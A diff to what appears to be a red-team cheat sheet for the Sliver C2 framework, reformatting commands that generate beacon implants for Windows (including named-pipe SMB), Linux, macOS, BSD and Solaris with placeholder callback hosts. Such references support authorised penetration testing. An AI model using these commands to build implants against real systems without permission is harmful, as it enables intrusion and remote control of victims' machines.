@@ -75,37 +75,53 @@ sliver > generate beacon -a <architecture> -l -S <seconds> -b http[s]://<IP>:<PO
 
 * Initial Foothold beacon
 
-`sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64] | [386 | x86] | arm | arm64> -o windows -f <exe | service | shared | shellcode> -s /path/to/directory`
+```
+sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64] | [386 | x86] | arm | arm64> -o windows -f <exe | service | shared | shellcode> -s /path/to/directory
+```
 
 * Name-piped SMB beacon
 
-`sliver > generate beacon -n <IP>//./pipe/<name_pipe> -a <[amd64 | x64] | [386 | x86] | arm | arm64> -o windows -f <exe | service | shared | shellcode> -s /path/to/directory`
+```
+sliver > generate beacon -n <IP>//./pipe/<name_pipe> -a <[amd64 | x64] | [386 | x86] | arm | arm64> -o windows -f <exe | service | shared | shellcode> -s /path/to/directory
+```
 
 #### 4.1.2.3 - Linux
 
-`sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64] | [386 | x86] | arm | arm64 | loong64 | mips | mips64 | mips64le | mipsle | ppc64 | ppc64le | riscv64 | s390x> -o linux -f <exe | shared | shellcode> -s /path/to/directory`
+```
+sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64] | [386 | x86] | arm | arm64 | loong64 | mips | mips64 | mips64le | mipsle | ppc64 | ppc64le | riscv64 | s390x> -o linux -f <exe | shared | shellcode> -s /path/to/directory
+```
 
 #### 4.1.2.4 - OSX
 
-`sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64] | arm64> -o darwin -f <exe | shared | shellcode> -s /path/to/directory`
+```
+sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64] | arm64> -o darwin -f <exe | shared | shellcode> -s /path/to/directory
+```
 
 #### 4.1.2.5 - BSD
 
 * FreeBSD
 
-`sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64] | arm | arm64 | riscv64> -o freebsd -f exe -s /path/to/directory`
+```
+sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64] | arm | arm64 | riscv64> -o freebsd -f exe -s /path/to/directory
+```
 
 * NetBSD
 
-`sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64] | arm | arm64 | riscv64> -o netbsd -f exe -s /path/to/directory`
+```
+sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64] | arm | arm64 | riscv64> -o netbsd -f exe -s /path/to/directory
+```
 
 * OpenBSD
 
-`sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64] | arm | arm64 | riscv64> -o openbsd -f exe -s /path/to/directory`
+```
+sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64] | arm | arm64 | riscv64> -o openbsd -f exe -s /path/to/directory
+```
 
 #### 4.1.2.6 - Solaris
 
-`sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64]> -o solaris -f exe -s /path/to/directory`
+```
+sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64]> -o solaris -f exe -s /path/to/directory
+```
 
 ### 4.1.3 - Profiles
 
